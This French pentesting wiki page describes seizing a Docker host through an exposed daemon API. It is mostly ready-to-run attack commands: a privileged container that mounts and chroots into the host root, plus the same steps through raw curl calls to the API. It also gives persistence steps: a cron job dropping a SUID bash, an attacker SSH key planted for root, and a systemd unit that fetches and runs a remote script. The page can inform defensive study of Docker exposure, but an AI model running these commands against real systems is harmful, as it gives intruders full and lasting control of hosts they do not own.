---
order: 2
title: "Prise de contrôle de l'hôte via un run privilégié : s'emparer de l'hôte grâce à un conteneur conçu"
description: "L'étape décisive après avoir atteint l'API Docker est de lancer un conteneur privilégié qui monte en bind le système de fichiers racine de l'hôte. Ce conteneur est root sur l'hôte par construction, de sorte qu'un chroot dans le montage, ou l'écriture d'une tâche cron, d'une clé SSH ou d'un binaire SUID à travers lui, donne une compromission durable de l'hôte, indépendamment des restrictions propres au conteneur courant."
keywords:
  - conteneur privilégié
  - montage de l'hôte
  - docker run
  - prise de contrôle de l'hôte
  - persistance
---

# Prise de contrôle de l'hôte via un run privilégié

Atteindre l'API Docker est l'accès ; lancer le bon conteneur est la prise de contrôle. Le daemon s'exécute en tant que root sur l'hôte, de sorte qu'un conteneur qu'il crée avec la racine de l'hôte montée en bind et le flag privileged activé est, en pratique, un shell root sur l'hôte. C'est l'étape finale, que l'API ait été atteinte sans authentification sur 2375, via un TLS faible sur 2376, ou via une socket montée à l'intérieur d'un autre conteneur.

## Le conteneur décisif

```bash
H=tcp://<target>:2375
# interactive host root
docker -H $H run -v /:/host --privileged --rm -it alpine chroot /host bash
```

À travers le montage sur `/host`, tout ce qui se trouve sur l'hôte est accessible en écriture en tant que root. Choisissez un mécanisme de persistance plutôt qu'un simple shell :

```bash
# cron job that drops a SUID bash on the host
echo '* * * * * root cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > /host/etc/cron.d/x
# attacker SSH key for the host root account
mkdir -p /host/root/.ssh && echo 'ssh-ed25519 AAAA... a' >> /host/root/.ssh/authorized_keys
# a systemd unit executed on next boot or reload
printf '[Service]\nExecStart=/bin/sh -c "curl http://a/c|sh"\n[Install]\nWantedBy=multi-user.target\n' \
  > /host/etc/systemd/system/x.service
```

## Variante via l'API brute

Sans le CLI Docker, créez et démarrez le même conteneur via l'API HTTP :

```bash
cid=$(curl -s -XPOST http://<target>:2375/containers/create \
  -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["chroot","/host","sh","-c","id"],
       "HostConfig":{"Binds":["/:/host"],"Privileged":true}}' \
  | sed 's/.*"Id":"\([^"]*\)".*/\1/')
curl -s -XPOST http://<target>:2375/containers/$cid/start
curl -s "http://<target>:2375/containers/$cid/logs?stdout=1&stderr=1"
```

## Notes d'exploitation

- Préférez une écriture de persistance déterministe (cron, authorized_keys, unité systemd) plutôt que de conserver une session interactive, pour que l'accès survive à la suppression du conteneur.
- Réutilisez une image que le daemon possède déjà pour éviter un pull ; `docker -H $H images` les liste, et n'importe quelle base Linux convient puisque vous opérez immédiatement sur le montage de l'hôte.
- Un daemon rootless limite le montage aux privilèges de l'utilisateur appelant ; confirmez avec `docker -H $H info | grep -i rootless` et repliez-vous sur l'énumération des secrets accessibles à l'utilisateur le cas échéant.
- Le mécanisme est identique à celui d'une socket de runtime montée ; voir [Montage de socket de runtime](../../../container-escape/sensitive-mounts/runtime-socket-mount.md) pour les équivalents containerd et CRI-O.

## Références

- [Docker Engine API: create a container](https://docs.docker.com/reference/api/engine/)
- [HackTricks: Docker API host takeover](https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker)
